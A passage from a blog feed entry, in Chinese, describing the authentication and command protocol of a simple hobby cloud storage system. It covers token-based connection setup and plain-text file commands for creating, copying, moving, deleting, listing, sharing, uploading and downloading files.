&lt;figure class=&quot;highlight gherkin&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; ----------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|&lt;span class=&quot;string&quot;&gt;  8 bytes  &lt;/span&gt;|&lt;span class=&quot;string&quot;&gt;  8 bytes  &lt;/span&gt;|&lt;span class=&quot;string&quot;&gt;  encoded data  &lt;/span&gt;|&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; ----------------------------------------&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;非固定活动连接建立过程&quot;&gt;&lt;a href=&quot;#非固定活动连接建立过程&quot; class=&quot;headerlink&quot; title=&quot;非固定活动连接建立过程&quot;&gt;&lt;/a&gt;非固定活动连接建立过程&lt;/h2&gt;&lt;p&gt;当客户端需要执行传输文件操作时，主动向服务器申请连接。连接过程和上面 “认证数据协议格式” 过程类似：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器向客户端发送新的随机密钥 token0&lt;/li&gt;
&lt;li&gt;客户端不再将用户名和密码的 MD5 值发送给服务器，而是将用户名和之前登录认证时获得的 token1 连接在一起，使用 token0 加密，并发送给服务器（发送此段消息时，使用 格式0 ）&lt;/li&gt;
&lt;li&gt;服务器接收到数据后首先解析用户名，发现该用户已登录，则将密码部分字段和该用户登录认证时使用的 token1 比对，符合则返回 token0，否则主动断开连接&lt;/li&gt;
&lt;li&gt;客户端检查 token0 无误后开始发送相应指令&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;被动监听推送消息连接过程&quot;&gt;&lt;a href=&quot;#被动监听推送消息连接过程&quot; class=&quot;headerlink&quot; title=&quot;被动监听推送消息连接过程&quot;&gt;&lt;/a&gt;被动监听推送消息连接过程&lt;/h2&gt;&lt;p&gt;此连接和上述 “非固定活动连接建立过程” 类似，区别在于，该连接在整个客户端存活期间均得以保持。为了将此连接和用于传输长数据流的数据区分，服务器将会把用户登录后申请的第一个 “非固定活动连接”（即密码字段填写 token1 的连接）视作客户端用来监听推送消息的连接，而之后的连接均视作用于传输长数据流的连接。&lt;/p&gt;
&lt;h1 id=&quot;执行指令协议&quot;&gt;&lt;a href=&quot;#执行指令协议&quot; class=&quot;headerlink&quot; title=&quot;执行指令协议&quot;&gt;&lt;/a&gt;执行指令协议&lt;/h1&gt;&lt;p&gt;下面考虑客户端向服务器发送的指令格式，根据指令执行所需要传输的数据流长短，将指令分为端数据流传输指令和长数据流传输指令。其中长数据流传输指令包括文件的上传、下载以及更新。为了简化客户端的实现（正式客户端使用 C++ 编写），指令的传输使用纯文本代替了 JSON 格式。下面用 &lt;code&gt;SEP&lt;/code&gt; 表示指令间各个选项的分隔符。&lt;code&gt;SEP&lt;/code&gt; 是项目中配置文件可以指定的一个字符串。&lt;/p&gt;
&lt;h2 id=&quot;短数据流传输指令&quot;&gt;&lt;a href=&quot;#短数据流传输指令&quot; class=&quot;headerlink&quot; title=&quot;短数据流传输指令&quot;&gt;&lt;/a&gt;短数据流传输指令&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;创建：在云存储空间中创建一个新的文件（夹），初始大小为 0。如果该文件是文本类型，则用户可在线编辑该文件并保存。对于创建操作，需要指定创建的位置、创建的文件（夹）的名称、要创建的是文件还是文件夹。即：&lt;code&gt;TOUCH &amp;lt;SEP&amp;gt; PATH &amp;lt;SEP&amp;gt; NAME &amp;lt;SEP&amp;gt; ISDIR&lt;/code&gt;，&lt;code&gt;ISDIR&lt;/code&gt;为 0 时创建文件，为 1 时创建文件夹。&lt;code&gt;PATH&lt;/code&gt;为绝对路径，如 &lt;code&gt;/home/forec/work/&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;复制：将某个文件（夹）拷贝到一个新的位置，即：&lt;code&gt;CP &amp;lt;SEP&amp;gt; UID &amp;lt;SEP&amp;gt; NEWPATH&lt;/code&gt;，其中 &lt;code&gt;UID&lt;/code&gt; 为要复制的文件（夹）的 ID，以下 &lt;code&gt;UID&lt;/code&gt; 均指此意，&lt;code&gt;NEWPATH&lt;/code&gt; 为绝对路径。&lt;/li&gt;
&lt;li&gt;移动：将某个文件（夹）移动到一个新的位置，同时指定新的文件（夹）名，即：&lt;code&gt;MV &amp;lt;SEP&amp;gt; UID &amp;lt;SEP&amp;gt; NEWNAME &amp;lt;SEP&amp;gt; NEWPATH&lt;/code&gt;，其中 &lt;code&gt;NEWPATH&lt;/code&gt;为绝对路径。&lt;/li&gt;
&lt;li&gt;删除：删除某个文件（夹），若为文件夹，该目录下所有文件（夹）均被删除，即&lt;code&gt;RM &amp;lt;SEP&amp;gt; UID&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;获取文件列表：获取某个目录下的文件（夹）列表，支持按关键词筛选，即：&lt;code&gt;LS &amp;lt;SEP&amp;gt; RECURSSIVE &amp;lt;SEP&amp;gt; PATH &amp;lt;SEP&amp;gt; ARG0 &amp;lt;SEP&amp;gt; ARG1 &amp;lt;SEP&amp;gt; ...&lt;/code&gt;。其中，&lt;code&gt;RECURSSIVE&lt;/code&gt;为 0 表示仅显示该目录下的文件（夹），为 1 表示递归显示，将整个目录内的所有文件（夹）列表返回给客户端；&lt;code&gt;PATH&lt;/code&gt; 为绝对路径，&lt;code&gt;ARGn&lt;/code&gt; 为要筛选的关键词，例如在 &lt;code&gt;SEP&lt;/code&gt; 为 &lt;code&gt;+&lt;/code&gt; ，筛选条件为路径 &lt;code&gt;/home/&lt;/code&gt; 下所有文件（夹）名包括 &lt;code&gt;ed&lt;/code&gt; 和 &lt;code&gt;afd&lt;/code&gt; 的情况下，可使用 &lt;code&gt;LS+1+/home/+ed+afd&lt;/code&gt;。服务器向客户端返回的是一个以 &lt;code&gt;\n&lt;/code&gt; 划分的纯文本流，每行为一个文件记录，记录各项之间以 &lt;code&gt;SEP&lt;/code&gt; 划分。&lt;/li&gt;
&lt;li&gt;FORK：Fork其它用户的文件（夹），即：&lt;code&gt;FORK &amp;lt;SEP&amp;gt; UID &amp;lt;SEP&amp;gt; PASSWORD &amp;lt;SEP&amp;gt; NEWPATH&lt;/code&gt;，其中 &lt;code&gt;PASSWORD&lt;/code&gt; 是要 Fork 的文件（夹）的提取码，如果不存在提取码则可为任意值，&lt;code&gt;NEWPATH&lt;/code&gt; 为要 Fork 到自己存储空间中的路径， &lt;code&gt;UID&lt;/code&gt; 为要 Fork 的文件（夹）的唯一标识。&lt;/li&gt;
&lt;li&gt;改变私有/共享：改变某个文件（夹）的私有或共享性质，即：&lt;code&gt;CHMOD &amp;lt;SEP&amp;gt; UID &amp;lt;SEP&amp;gt; PRIVATE&lt;/code&gt;，其中 &lt;code&gt;PRIVATE&lt;/code&gt; 为 0 表示共享，&lt;code&gt;PRIVATE&lt;/code&gt; 为 1 表示私有，若 &lt;code&gt;PRIVATE&lt;/code&gt; 为 1，则系统将随机生成一个 4 位提取码，并将该文件或文件夹下的所有文件提取码设置为该提取码。&lt;/li&gt;
&lt;li&gt;向其他用户发送消息：即 &lt;code&gt;SEND &amp;lt;SEP&amp;gt; CID &amp;lt;SEP&amp;gt; MESSAGE&lt;/code&gt;，其中 &lt;code&gt;CID&lt;/code&gt; 为对方的唯一标识符，&lt;code&gt;MESSAGE&lt;/code&gt; 为要发送的消息，其中不能包含 &lt;code&gt;SEP&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;以上所有消息均会返回一个状态码，表示成功或错误信息。状态码将在具体实现时讨论。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;长数据流传输指令&quot;&gt;&lt;a href=&quot;#长数据流传输指令&quot; class=&quot;headerlink&quot; title=&quot;长数据流传输指令&quot;&gt;&lt;/a&gt;长数据流传输指令&lt;/h2&gt;&lt;h3 id=&quot;下载文件（夹）&quot;&gt;&lt;a href=&quot;#下载文件（夹）&quot; class=&quot;headerlink&quot; title=&quot;下载文件（夹）&quot;&gt;&lt;/a&gt;下载文件（夹）&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;下载指定 &lt;code&gt;UID&lt;/code&gt; 对应的文件（夹），即：&lt;code&gt;GET &amp;lt;SEP&amp;gt; UID &amp;lt;SEP&amp;gt; PASSWORD&lt;/code&gt;。当 &lt;code&gt;UID&lt;/code&gt; 指向的记录不是用户自己的时，需要使用 &lt;code&gt;PASSWORD&lt;/code&gt; 作为提取码，如果要下载的 &lt;code&gt;UID&lt;/code&gt; 是用户自己的文件（夹），则 &lt;code&gt;PASSWORD&lt;/code&gt; 可以填写任意非空值（这里为了简化服务器对指令的识别，选择了非常幼稚的方法）。每启动一条这样的指令，客户端将主动建立一个新的长数据流传输连接，当客户端创建的长数据流传输连接达到设置的上限时，客户端将阻止创建新的连接，并将新的命令排队，直到此前的长数据流传输连接结束后，才会启动下载线程。&lt;/li&gt;
&lt;li&gt;服务器与客户端传输线程之间交互的过程：&lt;ul&gt;
&lt;li&gt;服务器发送要下载的文件数目（包括文件夹的数目）&lt;/li&gt;
&lt;li&gt;对每个文件：&lt;/li&gt;
&lt;li&gt;服务器发送该文件文件名&lt;/li&gt;
&lt;li&gt;服务器发送 &lt;code&gt;ISDIR&lt;/code&gt;，即是文件还是文件夹（0或1），若该文件为文件夹（1），则跳过下面的循环&lt;/li&gt;
&lt;li&gt;服务器开始传输文件&lt;/li&gt;
&lt;li&gt;文件传输结束，进入下一个循环&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;上传文件&quot;&gt;&lt;a href=&quot;#上传文件&quot; class=&quot;headerlink&quot; title=&quot;上传文件&quot;&gt;&lt;/a&gt;上传文件&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;上传一个新的文件，即：&lt;code&gt;PUT &amp;lt;SEP&amp;gt; ISDIR &amp;lt;SEP&amp;gt; MD5 &amp;lt;SEP&amp;gt; FILENAME &amp;lt;SEP&amp;gt; PATH&lt;/code&gt;。其中 &lt;code&gt;ISDIR&lt;/code&gt; 表示是文件或文件夹，&lt;code&gt;MD5&lt;/code&gt; 为客户端计算的文件的 MD5 值，若为文件夹则随意填写，&lt;code&gt;FILENAME&lt;/code&gt; 为上传后在云存储中的文件名，&lt;code&gt;PATH&lt;/code&gt; 为上传到云存储中的路径。&lt;/li&gt;
&lt;li&gt;服务器与客户端传输线程之间交互的过程：&lt;ul&gt;
&lt;li&gt;服务器接收客户端发送的 GET 指令&lt;/li&gt;
&lt;li&gt;服务器向客户端发送标识码，若为成功（200），则开始传输；若为不需传送（300），则客户端停止发送文件并认为秒传成功；若为失败（400），则客户端提示错误&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;更新文件&quot;&gt;&lt;a href=&quot;#更新文件&quot; class=&quot;headerlink&quot; title=&quot;更新文件&quot;&gt;&lt;/a&gt;更新文件&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;更新一个已有的文件，即： &lt;code&gt;UPDATE &amp;lt;SEP&amp;gt; UID &amp;lt;SEP&amp;gt; MD5&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;服务器与客户端传输线程之间交互过程：&lt;ul&gt;
&lt;li&gt;服务器接收客户端发送的 UPDATE 指令&lt;/li&gt;
&lt;li&gt;若云存储中存在新的 MD5 值，则向客户端发送不需传送（300），客户端停止发送并认为秒传成功&lt;/li&gt;
&lt;li&gt;若云存储中不存在新的 MD5 值，则向客户端发送开始传送（200），传送结束后，修改原 UID 指向的文件块&lt;/li&gt;
&lt;li&gt;若发现 UPDATE 指令不合法，则返回错误码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;指令的简化&quot;&gt;&lt;a href=&quot;#指令的简化&quot; class=&quot;headerlink&quot; title=&quot;指令的简化&quot;&gt;&lt;/a&gt;指令的简化&lt;/h2&gt;&lt;p&gt;为了简化客户端设计，服务器应当尽量对客户端发送的指令容错。例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件下载时，客户端仅需发送 UID，服务器根据 UID 指向的记录，为客户端安排下载策略&lt;/li&gt;
&lt;li&gt;文件创建/移动/复制时，若目标路径不存在，服务器应向数据库中添加缺失的路径&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;专栏目录：&lt;a href=&quot;http://blog.forec.cn/columns/cloud-storage.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;云存储系统从入门到放弃&lt;/a&gt;&lt;br&gt;此专栏的上一篇文章：&lt;a href=&quot;http://blog.forec.cn/2016/11/12/cloud-storage-system-0/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;简易云存储系统项目简介&lt;/a&gt;&lt;br&gt;此专栏的下一篇文章：&lt;a href=&quot;http://blog.forec.cn/2016/11/14/cloud-storage-system-2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;简易云存储系统传输协议实现和封装&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章&lt;a href=&quot;http://blog.forec.cn/2016/11/13/cloud-storage-system-1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原始出处&lt;/a&gt;(&lt;a href=&quot;http://blog.forec.cn/2016/11/13/cloud-storage-system-1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.forec.cn/2016/11/13/cloud-storage-system-1/&lt;/a&gt;) 、作者信息（&lt;a href=&quot;http://forec.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Forec&lt;/a&gt;）和本声明。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;分析、设计简易云存储系统之间的协议，包括用户客户端和服务器之间的认证协议、数据传输的协议以及新加入线程的认证。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Code" scheme="http://forec.github.io/categories/Code/"/>
    
    
      <category term="Golang" scheme="http://forec.github.io/tags/Golang/"/>
    
      <category term="云存储" scheme="http://forec.github.io/tags/%E4%BA%91%E5%AD%98%E5%82%A8/"/>
    
      <category term="线程" scheme="http://forec.github.io/tags/%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
</feed>
